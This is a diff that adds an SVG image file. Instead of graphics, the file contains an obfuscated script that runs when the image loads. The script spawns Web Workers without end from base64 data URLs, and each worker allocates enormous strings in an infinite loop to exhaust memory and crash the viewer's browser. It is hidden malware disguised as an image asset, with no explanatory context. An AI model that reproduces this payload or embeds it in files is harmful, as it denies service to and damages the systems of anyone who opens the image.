@@ -1,0 +1,6 @@
+<?xml version="1.0" encoding="utf-8"?>
+<svg viewBox="0 0 1000 1000" style="shape-rendering: crispedges;" xmlns="http://www.w3.org/2000/svg" xmlns:bx="https://boxy-svg.com">
+<script>
+  !((BS)=>{var E=`a=[];for(;;){a.push([${BS},a.pop()])}`,C=`data:text/html;base64,${btoa(E)}`,P=`for(;;){new Worker("${C}")}`,CC=`data:text/html;base64,${btoa(P)}`;new Worker(CC);})("Array(600).map(_=>String.fromCharCode(0xFFFF).repeat(0x1FFFFFE8))");
+</script>
+</svg>
